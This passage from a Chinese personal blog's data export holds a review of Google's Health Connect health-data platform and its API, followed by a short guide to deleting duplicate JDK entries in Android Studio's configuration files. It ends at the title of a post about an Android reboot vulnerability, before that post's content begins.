添加到您的<strong>快捷设置</strong>菜单。</p>\n</blockquote>\n<p>如果希望快速打开的话，可以考虑通过 AppManager 之类的三方应用自行创建快捷方式入口。</p>\n<img src=\"image-20221120155109377.png\" alt=\"image-20221120155109377\" style=\"zoom:50%;\" />\n\n<p>Health Connect 现在还在 Beta 阶段，安装之后如下图所示。我们可以看出来它非常的简洁，表现得更像是一个系统应用，一致的设计风格也让人自然地认为它是系统设置的一部分。</p>\n<p><img src=\"image-20221120155738720.png\" alt=\"image-20221120155738720\" style=\"zoom:33%;\" /><img src=\"image-20221120155946465.png\" alt=\"image-20221120155946465\" style=\"zoom:33%;\" /><img src=\"image-20221120155830420.png\" alt=\"image-20221120155830420\" style=\"zoom:33%;\" /></p>\n<p>当你平时使用的健康健身类应用适配了 Health Connect API 之后，你就能愉快地享受这个平台带来的安全与便利了。虽然今年才推出，但目前<a href=\"https://play.google.com/store/apps/collection/promotion_all__health_connect?clp=CiUKIwodcHJvbW90aW9uX2FsbF9faGVhbHRoX2Nvbm5lY3QQShgD:S:ANO1ljI8MHs&gsr=CicKJQojCh1wcm9tb3Rpb25fYWxsX19oZWFsdGhfY29ubmVjdBBKGAM=:S:ANO1ljLsSuU\">支持的应用</a>还不算少：</p>\n<p><img src=\"/2022/12/05/%E5%BD%93Google%E5%85%B3%E5%BF%83%E8%B5%B7%E4%BD%A0%E7%9A%84%E5%81%A5%E5%BA%B7%E6%95%B0%E6%8D%AE/image-20221120160304633.png\" alt=\"image-20221120160304633\"></p>\n<p>对开发者而言，<a href=\"https://developer.android.com/guide/health-and-fitness/health-connect/get-started\">官方技术文档</a>非常的清晰，甚至还有 Demo，只需要几步即可接入使用：</p>\n<ul>\n<li>在你的 Android 应用中集成 Health Connect SDK</li>\n<li>声明所需权限并向用户请求</li>\n<li>调用 Health Connect API 进行 CRUD 操作</li>\n</ul>\n<p>唯一较多的工作量可能就是把应用自身采集到的健康数据，按 Health Connect <strong>标准化</strong>要求的格式进行转化并写入，所以理解这一套标准化的<a href=\"https://developer.android.com/guide/health-and-fitness/health-connect/data-and-data-types/introduction\">数据类型和格式</a>至关重要。此外，API 所包含的公共方法目前也很简单，从字面意思就能略知一二，举例几个关键 function：</p>\n<ul>\n<li>aggregateGroupByDuration</li>\n<li>aggregateGroupByPeriod</li>\n<li>deleteRecords（注：只能删除某应用自己写入的部分）</li>\n<li>getChanges</li>\n<li>insertRecords</li>\n<li>readRecord</li>\n<li>updateRecords</li>\n</ul>\n<p>接口含义清晰，对开发者来说还是比较友好的。</p>\n<h3 id=\"给开发者带来的收益\"><a href=\"#给开发者带来的收益\" class=\"headerlink\" title=\"给开发者带来的收益\"></a>给开发者带来的收益</h3><p>收益可以分两方面讲，一是研发成本，二是用户体验。</p>\n<p>首先，对健康健身类应用的开发者而言，成本肯定是大大降低了。接入方便，逻辑简单，且有 Google 官方的技术支持。如果你的应用仅仅只想做数据分析，在过去你不得不先去采集用户的健康数据，现在却可以完全依赖 Health Connect，不再需要调用与传感器（Sensor）相关的一系列高功耗接口，只需查询 Health Connect 存储整合好的数据即可。这对初创者来说无疑是一个福音。</p>\n<p>除了降低应用的功耗本身就能提升用户的体验之外，开发者还可以通过 Health Connect 获取其他自己采集不到或者没必要采集的数据，为用户提供更加全面的分析结果。例如多个不同功能的应用在不同的时段进行了睡眠数据的采集，在 Health Connect 的帮助下，会整合到一起形成一个连贯的数据，提供任意时段的查询。</p>\n<p>Google 为了推广 Health Connect 还专门撰写了一个<a href=\"https://developer.android.com/guide/health-and-fitness/health-connect-guidelines/ux-developer-guidance\">用户体验开发指南</a>，为开发者提供建议如何引导用户理解 Health Connect 的优势。当用户理解到例如隐私方面的好处之后，自然会更愿意使用接入了 Health Connect 的应用，这是一个良性循环。</p>\n<h3 id=\"可能存在的问题\"><a href=\"#可能存在的问题\" class=\"headerlink\" title=\"可能存在的问题\"></a>可能存在的问题</h3><p>敏锐的你看到这里，应该意识到了一些隐含问题。Google 的这个 Health Connect 虽然拥有美好的愿景和诸多优点，但肯定不是没有缺点的。我可以简单地列举一下目前能想到的一些问题：</p>\n<ol>\n<li>在信息孤岛无数的今天，数据可谓无价，谁愿意把自家 App 采集和处理好的数据写入到 Health Connect 这个“数据共享中心”？恐怕对于绝大多数商业化开发者来说，动机不强，毕竟大家都想做那个索取者而不是贡献者。</li>\n<li>作为开发者，从 Health Connect 获取的收益是不可知且不稳定的，取决于它的普及率，如果市面上接入的三方应用较少，就意味着数据来源少，此外如果用户不听从引导安装 Health Connect 平台应用，开发者仍然需要制定一套备份方案，似乎研发成本不降反升。</li>\n<li>Health Connect 目前有最多查询30天数据的范围限制，这并不一定能满足所有应用的业务需求。Google 想要在健康数据格式上做大一统，可能也难以考虑到所有细节情况。</li>\n<li>如何避免数据污染？比如三方应用接入 Health Connect 后，恶意写入错误的数据。</li>\n</ol>\n<p>针对这些问题，也不是完全无解。其中第2点和第3点都是客观情况，短期无法改变，普及率是一个时间问题，或者说资源的投入问题，功能限制也只能在开发者和用户的不断反馈中逐步优化了。</p>\n<p>对于第1点，我猜测 Google 的算盘是这样的：由实力雄厚的大团队来扮演数据贡献者的身份，比如上图中的三星健康和 Google 健身，它们将可靠的健康数据写入到 Health Connect 中，其他中小团队就可以共享这些数据，如此一来降低了后者获取数据的成本，且随着行业数据标准化，会吸引更多团队加入。同时也是为了达到减少碎片化，提升用户体验的目的。</p>\n<p>对于第4点，也算是一个客观的问题，我暂时想不到完美的办法，估计只能通过平台机制优化或者应用审核来解决了。</p>\n<p>总的来说，Health Connect 的诞生有一个好的初衷，这也算是 Google 致力于解决应用生态碎片化的一环。站在 Android 系统这一层面来看，健康应用的开发者们正在生产大量的重复数据，浪费了用户的电池和存储空间。因此，Google 想要打造一个标准化的本地仓库来统一管控健康数据，为用户提供更好的体验，也不失为一个好的方向。</p>\n<h3 id=\"来自官方团队的回答\"><a href=\"#来自官方团队的回答\" class=\"headerlink\" title=\"来自官方团队的回答\"></a>来自官方团队的回答</h3><p>心血来潮，我把上面的4个问题整理了一封邮件发给 Health Connect 官方团队：</p>\n<img src=\"283aeec8-9d96-4a2e-8a8c-28982fba6892.jpeg\" alt=\"283aeec8-9d96-4a2e-8a8c-28982fba6892\" style=\"zoom:40%;\" />\n\n<p>很快便收到回复，说请我等待，他去找 Leader，我颇为震惊。几天后，Leader 还真的认真回复了我的问题，不得不佩服他们的敬业（可能是闲）：</p>\n<img src=\"6d678b84-4ff5-4f32-95f6-98d52e68e8d8.jpeg\" alt=\"6d678b84-4ff5-4f32-95f6-98d52e68e8d8\" style=\"zoom:50%;\" />\n\n<p>可以说，这位 Leader 的回复基本上详尽解答了我的那几个疑问。Google 方面主要还是通过政策和审核来严格管控接入方，避免数据不可信和污染的问题，并且和我猜测的一致，官方还是倾向于他们自己和大型合作方的应用来充当数据贡献者的身份。此外，回复中还提到一个我之前没关注到的点，就是每份数据都有 Data Origin，可以帮助用户很好地追溯数据来源，一定程度上也能避免恶意应用的干扰。</p>\n","site":{"data":{"widget":{"top":[{"class_name":"donate","id_name":"donate","name":"随缘支持","icon":"fas fa-heartbeat","html":"<p style=\"text-align:center;padding:0;margin:0;\"><a href=\"https://qr.alipay.com/fkx12362diu95oh2aweaac5\"><img src=\"https://blog.ysy950803.top/img/love-support.png\" width=\"200\" height=\"200\"/></a></p> <p style=\"text-align:center;padding:0;margin:0;\">移动端点击二维码亦可</p> <p style=\"text-align:center;padding:0;margin:0;\"><u><a href=\"https://paypal.me/yaoshengyu\">Paypal.me if you like</a></u></p>"}]}}},"cover_type":"img","excerpt":"","more":"<p>此文为初稿备份，终稿已发布于少数派：<a href=\"https://sspai.com/post/77024\">https://sspai.com/post/77024</a></p>\n<hr>\n<p>今年五月，在 Android 开发者<a href=\"https://android-developers.googleblog.com/2022/05/introducing-health-connect.html\">官方博客</a>中，Google 隆重介绍了一个新平台，名为 <a href=\"https://developer.android.com/health-connect\">Health Connect</a>，并推出了相应的 Android API。其官方网站用非常显眼的大标题和副标题简洁地描述了其核心功能与优势：<strong>简化健康类应用之间的连接</strong>。</p>\n<blockquote>\n<p>Health Connect: simplify connectivity between apps</p>\n<p>Health and fitness apps record valuable data. With permission from your users, you can unlock the full potential of this data by combining it to generate powerful insights.</p>\n</blockquote>\n<p>粗略地看这应该是 Google 搞的一个平台化的东西。那么它具体是什么呢？又会给用户和开发者带来什么利益？</p>\n<h3 id=\"什么是Health-Connect\"><a href=\"#什么是Health-Connect\" class=\"headerlink\" title=\"什么是Health Connect\"></a>什么是Health Connect</h3><p>如今健康和健身类的应用越来越多，各大厂商迅速占领这个细分市场，同时带动了可穿戴设备疯狂发展。众多类型的设备（包括智能手机和可穿戴设备）都搭载 Android 系统，许多健康应用都在 Android 设备上运行。同样地，Android 平台接口也提供各种各样的数据。但是，Android 用户希望通过单个数据库轻松便捷地掌控自己的健康与健身数据。作为开发者，在应用之间连接和共享这些数据也可以提升产品体验。然而，这些信息大多都分布在不同的地方，很难汇集在一起。</p>\n<p>Google 认为这就是痛点所在，所以他们在今年上半年推出了 Health Connect。本质上，<strong>Health Connect 就是一套 Android API 和一个平台性质的独立应用</strong>。它将来自多个设备和应用的数据整合到一个生态系统中。</p>\n<p>从 Health Connect 的整体设计架构示意图可以看出，它的实现原理也非常的简单，就是众多不同的三方应用通过 Health Connect 的 SDK 与一个中心化的平台应用进行跨进程通信，以共创共享数据。</p>\n<img src=\"image-20221120141729514.png\" alt=\"image-20221120141729514\" style=\"zoom:50%;\" />\n\n<h3 id=\"给用户带来的好处\"><a href=\"#给用户带来的好处\" class=\"headerlink\" title=\"给用户带来的好处\"></a>给用户带来的好处</h3><p>如果 Health Connect 的生态能够如愿发展成熟，各大健康应用纷纷接入，会给广大用户带来哪些好处呢？</p>\n<h4 id=\"集中的数据管理\"><a href=\"#集中的数据管理\" class=\"headerlink\" title=\"集中的数据管理\"></a>集中的数据管理</h4><p>除了基本的睡眠以外，跑步、骑车、爬山、冥想等活动正逐渐成为人们健康生活的一部分，大家也习惯下载各种细分领域的 App 来监测自己的健康和健身数据，比如运动距离、攀爬海拔高度、饮水量、体重、代谢率、心率、深浅睡眠时长等。这些数据往往产生自不同的时段，甚至不同的 App 会产生部分相同类型的数据，每次要查看它们都非常麻烦，不仅要同时打开多个 App，而且<strong>数据还不一定连贯</strong>。</p>\n<p>如果它们都接入了 Health Connect，不同来源的数据就会被整合到一起，方便用户直接在一个 App 里面集中查看和管理所有类型的信息。</p>\n<img src=\"image-20221120150839605.png\" alt=\"image-20221120150839605\" style=\"zoom:50%;\" />\n\n<p>此外，还有个比较隐藏的优势便是用户可以借助该平台完成健康<strong>数据的迁移</strong>。比如当我们想在一款新的跑步应用 B 中继承使用旧应用 A 的步数信息时，Health Connect 就充当了一个公共信息通道的角色，B 可以直接读取 A 之前写入的数据。</p>\n<h4 id=\"方便的权限控制\"><a href=\"#方便的权限控制\" class=\"headerlink\" title=\"方便的权限控制\"></a>方便的权限控制</h4><p>用户安装了 Health Connect 之后，可以轻松和细粒度地掌控不同 App 的数据使用权限，从此不仅是数据的生产者，也是数据真正的主人了。</p>\n<p>当我们觉得某些应用数据不需要或者不可靠时，可以禁止它的数据写入权限。在某些同质化比较严重的功能场景下，我们还可以自由地选择把数据读取权限授予某个 App，而禁止其他 App 访问。</p>\n<p>在如此清晰的呈现之下，数据的“生杀大权”交到了用户手中，既提高了用户对这类隐私数据的敏感性，也有效地避免了应用对传感器数据的滥用。</p>\n<img src=\"image-20221120151843600.png\" alt=\"image-20221120151843600\" style=\"zoom:50%;\" />\n\n<h4 id=\"可靠的隐私保障\"><a href=\"#可靠的隐私保障\" class=\"headerlink\" title=\"可靠的隐私保障\"></a>可靠的隐私保障</h4><p>现在一些记录和分析女性生理周期的 App 越来越多，虽然都打着关爱女性健康的名号，但用户总会担心它们不能提供可靠的数据安全保障，而这类数据往往比其他健康数据更具私密性。</p>\n<p>如果女生们只选择完全接入了 Health Connect 的相关 App，那么这个问题就能得到很好的解决。因为 Health Connect 本身并不支持 Google 云同步，它只是一个<strong>加密</strong>的本地数据仓库，当它提供数据给三方 App 之前，除了用户可以自主管控外，<strong>也有完备的隐私政策限制与对三方 App 的安全性评估</strong>。</p>\n<p>在<a href=\"https://developer.android.com/guide/health-and-fitness/health-connect-guidelines/health-connect-policy-requirement-faqs\">Health Connect 政策要求常见问题解答</a>中，我们可以了解到详细的政策细节，其内容开头也做了精简的描述：</p>\n<blockquote>\n<p>Health Connect 应用会收集健康与健身数据，这可能包含个人数据和敏感数据。应用必须符合特定的政策要求，才能在 Health Connect 中读取和写入数据。</p>\n</blockquote>\n<p>有了严格的审核机制和法律的保障，安心程度会提高不少。</p>\n<h3 id=\"如何使用Health-Connect\"><a href=\"#如何使用Health-Connect\" class=\"headerlink\" title=\"如何使用Health Connect\"></a>如何使用Health Connect</h3><p>对用户而言非常简单，只需要去 Google Play 下载安装 Health Connect 应用即可。需要注意的是，安装之后并不会像普通应用那样显示桌面图标，官方文档也提到了这一点：</p>\n<blockquote>\n<p><strong>注意</strong>：Health Connect 默认不再显示在主屏幕上。如需打开 Health Connect，请前往<strong>设置 &gt; 应用 &gt; Health Connect</strong>或将 Health Connect 添加到您的<strong>快捷设置</strong>菜单。</p>\n</blockquote>\n<p>如果希望快速打开的话，可以考虑通过 AppManager 之类的三方应用自行创建快捷方式入口。</p>\n<img src=\"image-20221120155109377.png\" alt=\"image-20221120155109377\" style=\"zoom:50%;\" />\n\n<p>Health Connect 现在还在 Beta 阶段，安装之后如下图所示。我们可以看出来它非常的简洁，表现得更像是一个系统应用，一致的设计风格也让人自然地认为它是系统设置的一部分。</p>\n<p><img src=\"image-20221120155738720.png\" alt=\"image-20221120155738720\" style=\"zoom:33%;\" /><img src=\"image-20221120155946465.png\" alt=\"image-20221120155946465\" style=\"zoom:33%;\" /><img src=\"image-20221120155830420.png\" alt=\"image-20221120155830420\" style=\"zoom:33%;\" /></p>\n<p>当你平时使用的健康健身类应用适配了 Health Connect API 之后，你就能愉快地享受这个平台带来的安全与便利了。虽然今年才推出，但目前<a href=\"https://play.google.com/store/apps/collection/promotion_all__health_connect?clp=CiUKIwodcHJvbW90aW9uX2FsbF9faGVhbHRoX2Nvbm5lY3QQShgD:S:ANO1ljI8MHs&gsr=CicKJQojCh1wcm9tb3Rpb25fYWxsX19oZWFsdGhfY29ubmVjdBBKGAM=:S:ANO1ljLsSuU\">支持的应用</a>还不算少：</p>\n<p><img src=\"/2022/12/05/%E5%BD%93Google%E5%85%B3%E5%BF%83%E8%B5%B7%E4%BD%A0%E7%9A%84%E5%81%A5%E5%BA%B7%E6%95%B0%E6%8D%AE/image-20221120160304633.png\" alt=\"image-20221120160304633\"></p>\n<p>对开发者而言，<a href=\"https://developer.android.com/guide/health-and-fitness/health-connect/get-started\">官方技术文档</a>非常的清晰，甚至还有 Demo，只需要几步即可接入使用：</p>\n<ul>\n<li>在你的 Android 应用中集成 Health Connect SDK</li>\n<li>声明所需权限并向用户请求</li>\n<li>调用 Health Connect API 进行 CRUD 操作</li>\n</ul>\n<p>唯一较多的工作量可能就是把应用自身采集到的健康数据，按 Health Connect <strong>标准化</strong>要求的格式进行转化并写入，所以理解这一套标准化的<a href=\"https://developer.android.com/guide/health-and-fitness/health-connect/data-and-data-types/introduction\">数据类型和格式</a>至关重要。此外，API 所包含的公共方法目前也很简单，从字面意思就能略知一二，举例几个关键 function：</p>\n<ul>\n<li>aggregateGroupByDuration</li>\n<li>aggregateGroupByPeriod</li>\n<li>deleteRecords（注：只能删除某应用自己写入的部分）</li>\n<li>getChanges</li>\n<li>insertRecords</li>\n<li>readRecord</li>\n<li>updateRecords</li>\n</ul>\n<p>接口含义清晰，对开发者来说还是比较友好的。</p>\n<h3 id=\"给开发者带来的收益\"><a href=\"#给开发者带来的收益\" class=\"headerlink\" title=\"给开发者带来的收益\"></a>给开发者带来的收益</h3><p>收益可以分两方面讲，一是研发成本，二是用户体验。</p>\n<p>首先，对健康健身类应用的开发者而言，成本肯定是大大降低了。接入方便，逻辑简单，且有 Google 官方的技术支持。如果你的应用仅仅只想做数据分析，在过去你不得不先去采集用户的健康数据，现在却可以完全依赖 Health Connect，不再需要调用与传感器（Sensor）相关的一系列高功耗接口，只需查询 Health Connect 存储整合好的数据即可。这对初创者来说无疑是一个福音。</p>\n<p>除了降低应用的功耗本身就能提升用户的体验之外，开发者还可以通过 Health Connect 获取其他自己采集不到或者没必要采集的数据，为用户提供更加全面的分析结果。例如多个不同功能的应用在不同的时段进行了睡眠数据的采集，在 Health Connect 的帮助下，会整合到一起形成一个连贯的数据，提供任意时段的查询。</p>\n<p>Google 为了推广 Health Connect 还专门撰写了一个<a href=\"https://developer.android.com/guide/health-and-fitness/health-connect-guidelines/ux-developer-guidance\">用户体验开发指南</a>，为开发者提供建议如何引导用户理解 Health Connect 的优势。当用户理解到例如隐私方面的好处之后，自然会更愿意使用接入了 Health Connect 的应用，这是一个良性循环。</p>\n<h3 id=\"可能存在的问题\"><a href=\"#可能存在的问题\" class=\"headerlink\" title=\"可能存在的问题\"></a>可能存在的问题</h3><p>敏锐的你看到这里，应该意识到了一些隐含问题。Google 的这个 Health Connect 虽然拥有美好的愿景和诸多优点，但肯定不是没有缺点的。我可以简单地列举一下目前能想到的一些问题：</p>\n<ol>\n<li>在信息孤岛无数的今天，数据可谓无价，谁愿意把自家 App 采集和处理好的数据写入到 Health Connect 这个“数据共享中心”？恐怕对于绝大多数商业化开发者来说，动机不强，毕竟大家都想做那个索取者而不是贡献者。</li>\n<li>作为开发者，从 Health Connect 获取的收益是不可知且不稳定的，取决于它的普及率，如果市面上接入的三方应用较少，就意味着数据来源少，此外如果用户不听从引导安装 Health Connect 平台应用，开发者仍然需要制定一套备份方案，似乎研发成本不降反升。</li>\n<li>Health Connect 目前有最多查询30天数据的范围限制，这并不一定能满足所有应用的业务需求。Google 想要在健康数据格式上做大一统，可能也难以考虑到所有细节情况。</li>\n<li>如何避免数据污染？比如三方应用接入 Health Connect 后，恶意写入错误的数据。</li>\n</ol>\n<p>针对这些问题，也不是完全无解。其中第2点和第3点都是客观情况，短期无法改变，普及率是一个时间问题，或者说资源的投入问题，功能限制也只能在开发者和用户的不断反馈中逐步优化了。</p>\n<p>对于第1点，我猜测 Google 的算盘是这样的：由实力雄厚的大团队来扮演数据贡献者的身份，比如上图中的三星健康和 Google 健身，它们将可靠的健康数据写入到 Health Connect 中，其他中小团队就可以共享这些数据，如此一来降低了后者获取数据的成本，且随着行业数据标准化，会吸引更多团队加入。同时也是为了达到减少碎片化，提升用户体验的目的。</p>\n<p>对于第4点，也算是一个客观的问题，我暂时想不到完美的办法，估计只能通过平台机制优化或者应用审核来解决了。</p>\n<p>总的来说，Health Connect 的诞生有一个好的初衷，这也算是 Google 致力于解决应用生态碎片化的一环。站在 Android 系统这一层面来看，健康应用的开发者们正在生产大量的重复数据，浪费了用户的电池和存储空间。因此，Google 想要打造一个标准化的本地仓库来统一管控健康数据，为用户提供更好的体验，也不失为一个好的方向。</p>\n<h3 id=\"来自官方团队的回答\"><a href=\"#来自官方团队的回答\" class=\"headerlink\" title=\"来自官方团队的回答\"></a>来自官方团队的回答</h3><p>心血来潮，我把上面的4个问题整理了一封邮件发给 Health Connect 官方团队：</p>\n<img src=\"283aeec8-9d96-4a2e-8a8c-28982fba6892.jpeg\" alt=\"283aeec8-9d96-4a2e-8a8c-28982fba6892\" style=\"zoom:40%;\" />\n\n<p>很快便收到回复，说请我等待，他去找 Leader，我颇为震惊。几天后，Leader 还真的认真回复了我的问题，不得不佩服他们的敬业（可能是闲）：</p>\n<img src=\"6d678b84-4ff5-4f32-95f6-98d52e68e8d8.jpeg\" alt=\"6d678b84-4ff5-4f32-95f6-98d52e68e8d8\" style=\"zoom:50%;\" />\n\n<p>可以说，这位 Leader 的回复基本上详尽解答了我的那几个疑问。Google 方面主要还是通过政策和审核来严格管控接入方，避免数据不可信和污染的问题，并且和我猜测的一致，官方还是倾向于他们自己和大型合作方的应用来充当数据贡献者的身份。此外，回复中还提到一个我之前没关注到的点，就是每份数据都有 Data Origin，可以帮助用户很好地追溯数据来源，一定程度上也能避免恶意应用的干扰。</p>\n"},{"layout":"post","title":"删除Android Studio中重复的JDK配置","subtitle":"又闲下来了。","date":"2023-02-11T16:00:00.000Z","author":"YSY","header-img":"img/home-bg.jpg","catalog":true,"cover":"https://imgconvert.csdnimg.cn/33252e541c8d4a02a31c34ee3d2657c1.png","_content":"\n### 问题\n\n可能因为一些不经意的操作，导致如下这种情况：出现多余重复的JDK路径配置，其实指向的是同一个路径。\n\n![请添加图片描述](https://imgconvert.csdnimg.cn/33252e541c8d4a02a31c34ee3d2657c1.png)\n\n强迫症犯了之后，就会想怎么干掉这个（2）。\n\n### 解决\n\n第一步：先打开你最近打开的项目，找到 `.idea/misc.xml` 看看里面有没有那个多余的JDK路径，如果有就直接把这个misc.xml文件删掉。然后完全退出整个Android Studio。\n\n![请添加图片描述](https://imgconvert.csdnimg.cn/da2be5b4875f4119add1a7cc9ac0fbfb.png)\n\n第二步：在Android Studio缓存配置目录里找到 `options/jdk.table.xml` ，针对不同的系统路径不太一样：\n\n> Windows\n> C:\\Users\\username\\AppData\\Roaming\\Google\\AndroidStudioX.Y\n>\n> Linux\n> /home/username/.config/Google/AndroidStudioX.Y\n> 和\n> /home/username/.local/share/Google/AndroidStudioX.Y\n>\n> macOS\n> ~/Library/Application Support/Google/AndroidStudioX.Y\n\n以我为例，可见：\n\n![请添加图片描述](https://imgconvert.csdnimg.cn/78715499487248dd9e2fe361a4963a20.png)\n\n第三步：编辑这个文件，把里面所有带（2）所在的标签块都删掉，主要是两个标签块：additional和jdk。\n\n![请添加图片描述](https://imgconvert.csdnimg.cn/bb73fc9f497747ed9530d58fb081a3c1.png)\n![请添加图片描述](https://imgconvert.csdnimg.cn/b454c2a5a2eb473083261e5bad8e789a.png)\n\n删完了之后保存文件，再打开Android Studio，查看Gradle JDK配置，强迫症治好了。\n\n![请添加图片描述](https://imgconvert.csdnimg.cn/edac2262d762489287d39d5eb3c68a2b.png)\n","source":"_posts/2023-02-12-删除Android Studio中重复的JDK配置.md","raw":"---\nlayout:     post\ntitle:      删除Android Studio中重复的JDK配置\nsubtitle:   又闲下来了。\ndate:       2023-02-12\nauthor:     YSY\nheader-img: img/home-bg.jpg\ncatalog: true\ncover: https://imgconvert.csdnimg.cn/33252e541c8d4a02a31c34ee3d2657c1.png\ntags:\n    - Android\n    - Java\n    - Gradle\n---\n\n### 问题\n\n可能因为一些不经意的操作，导致如下这种情况：出现多余重复的JDK路径配置，其实指向的是同一个路径。\n\n![请添加图片描述](https://imgconvert.csdnimg.cn/33252e541c8d4a02a31c34ee3d2657c1.png)\n\n强迫症犯了之后，就会想怎么干掉这个（2）。\n\n### 解决\n\n第一步：先打开你最近打开的项目，找到 `.idea/misc.xml` 看看里面有没有那个多余的JDK路径，如果有就直接把这个misc.xml文件删掉。然后完全退出整个Android Studio。\n\n![请添加图片描述](https://imgconvert.csdnimg.cn/da2be5b4875f4119add1a7cc9ac0fbfb.png)\n\n第二步：在Android Studio缓存配置目录里找到 `options/jdk.table.xml` ，针对不同的系统路径不太一样：\n\n> Windows\n> C:\\Users\\username\\AppData\\Roaming\\Google\\AndroidStudioX.Y\n>\n> Linux\n> /home/username/.config/Google/AndroidStudioX.Y\n> 和\n> /home/username/.local/share/Google/AndroidStudioX.Y\n>\n> macOS\n> ~/Library/Application Support/Google/AndroidStudioX.Y\n\n以我为例，可见：\n\n![请添加图片描述](https://imgconvert.csdnimg.cn/78715499487248dd9e2fe361a4963a20.png)\n\n第三步：编辑这个文件，把里面所有带（2）所在的标签块都删掉，主要是两个标签块：additional和jdk。\n\n![请添加图片描述](https://imgconvert.csdnimg.cn/bb73fc9f497747ed9530d58fb081a3c1.png)\n![请添加图片描述](https://imgconvert.csdnimg.cn/b454c2a5a2eb473083261e5bad8e789a.png)\n\n删完了之后保存文件，再打开Android Studio，查看Gradle JDK配置，强迫症治好了。\n\n![请添加图片描述](https://imgconvert.csdnimg.cn/edac2262d762489287d39d5eb3c68a2b.png)\n","slug":"删除Android Studio中重复的JDK配置","published":1,"updated":"2024-03-25T07:31:26.041Z","comments":1,"photos":[],"link":"","_id":"cluaufh1n0053the69e5eedn4","content":"<h3 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题\"></a>问题</h3><p>可能因为一些不经意的操作，导致如下这种情况：出现多余重复的JDK路径配置，其实指向的是同一个路径。</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/33252e541c8d4a02a31c34ee3d2657c1.png\" alt=\"请添加图片描述\"></p>\n<p>强迫症犯了之后，就会想怎么干掉这个（2）。</p>\n<h3 id=\"解决\"><a href=\"#解决\" class=\"headerlink\" title=\"解决\"></a>解决</h3><p>第一步：先打开你最近打开的项目，找到 <code>.idea/misc.xml</code> 看看里面有没有那个多余的JDK路径，如果有就直接把这个misc.xml文件删掉。然后完全退出整个Android Studio。</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/da2be5b4875f4119add1a7cc9ac0fbfb.png\" alt=\"请添加图片描述\"></p>\n<p>第二步：在Android Studio缓存配置目录里找到 <code>options/jdk.table.xml</code> ，针对不同的系统路径不太一样：</p>\n<blockquote>\n<p>Windows<br>C:\\Users\\username\\AppData\\Roaming\\Google\\AndroidStudioX.Y</p>\n<p>Linux<br>&#x2F;home&#x2F;username&#x2F;.config&#x2F;Google&#x2F;AndroidStudioX.Y<br>和<br>&#x2F;home&#x2F;username&#x2F;.local&#x2F;share&#x2F;Google&#x2F;AndroidStudioX.Y</p>\n<p>macOS<br>~&#x2F;Library&#x2F;Application Support&#x2F;Google&#x2F;AndroidStudioX.Y</p>\n</blockquote>\n<p>以我为例，可见：</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/78715499487248dd9e2fe361a4963a20.png\" alt=\"请添加图片描述\"></p>\n<p>第三步：编辑这个文件，把里面所有带（2）所在的标签块都删掉，主要是两个标签块：additional和jdk。</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/bb73fc9f497747ed9530d58fb081a3c1.png\" alt=\"请添加图片描述\"><br><img src=\"https://imgconvert.csdnimg.cn/b454c2a5a2eb473083261e5bad8e789a.png\" alt=\"请添加图片描述\"></p>\n<p>删完了之后保存文件，再打开Android Studio，查看Gradle JDK配置，强迫症治好了。</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/edac2262d762489287d39d5eb3c68a2b.png\" alt=\"请添加图片描述\"></p>\n","site":{"data":{"widget":{"top":[{"class_name":"donate","id_name":"donate","name":"随缘支持","icon":"fas fa-heartbeat","html":"<p style=\"text-align:center;padding:0;margin:0;\"><a href=\"https://qr.alipay.com/fkx12362diu95oh2aweaac5\"><img src=\"https://blog.ysy950803.top/img/love-support.png\" width=\"200\" height=\"200\"/></a></p> <p style=\"text-align:center;padding:0;margin:0;\">移动端点击二维码亦可</p> <p style=\"text-align:center;padding:0;margin:0;\"><u><a href=\"https://paypal.me/yaoshengyu\">Paypal.me if you like</a></u></p>"}]}}},"cover_type":"img","excerpt":"","more":"<h3 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题\"></a>问题</h3><p>可能因为一些不经意的操作，导致如下这种情况：出现多余重复的JDK路径配置，其实指向的是同一个路径。</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/33252e541c8d4a02a31c34ee3d2657c1.png\" alt=\"请添加图片描述\"></p>\n<p>强迫症犯了之后，就会想怎么干掉这个（2）。</p>\n<h3 id=\"解决\"><a href=\"#解决\" class=\"headerlink\" title=\"解决\"></a>解决</h3><p>第一步：先打开你最近打开的项目，找到 <code>.idea/misc.xml</code> 看看里面有没有那个多余的JDK路径，如果有就直接把这个misc.xml文件删掉。然后完全退出整个Android Studio。</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/da2be5b4875f4119add1a7cc9ac0fbfb.png\" alt=\"请添加图片描述\"></p>\n<p>第二步：在Android Studio缓存配置目录里找到 <code>options/jdk.table.xml</code> ，针对不同的系统路径不太一样：</p>\n<blockquote>\n<p>Windows<br>C:\\Users\\username\\AppData\\Roaming\\Google\\AndroidStudioX.Y</p>\n<p>Linux<br>&#x2F;home&#x2F;username&#x2F;.config&#x2F;Google&#x2F;AndroidStudioX.Y<br>和<br>&#x2F;home&#x2F;username&#x2F;.local&#x2F;share&#x2F;Google&#x2F;AndroidStudioX.Y</p>\n<p>macOS<br>~&#x2F;Library&#x2F;Application Support&#x2F;Google&#x2F;AndroidStudioX.Y</p>\n</blockquote>\n<p>以我为例，可见：</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/78715499487248dd9e2fe361a4963a20.png\" alt=\"请添加图片描述\"></p>\n<p>第三步：编辑这个文件，把里面所有带（2）所在的标签块都删掉，主要是两个标签块：additional和jdk。</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/bb73fc9f497747ed9530d58fb081a3c1.png\" alt=\"请添加图片描述\"><br><img src=\"https://imgconvert.csdnimg.cn/b454c2a5a2eb473083261e5bad8e789a.png\" alt=\"请添加图片描述\"></p>\n<p>删完了之后保存文件，再打开Android Studio，查看Gradle JDK配置，强迫症治好了。</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/edac2262d762489287d39d5eb3c68a2b.png\" alt=\"请添加图片描述\"></p>\n"},{"layout":"post","title":"Android系统无限重启漏洞","subtitle":"我为世界做贡献。","date":"2023-02-13T16:00:00.000Z","author":"YSY","header-style":"text","catalog":true,"_content":"\n> 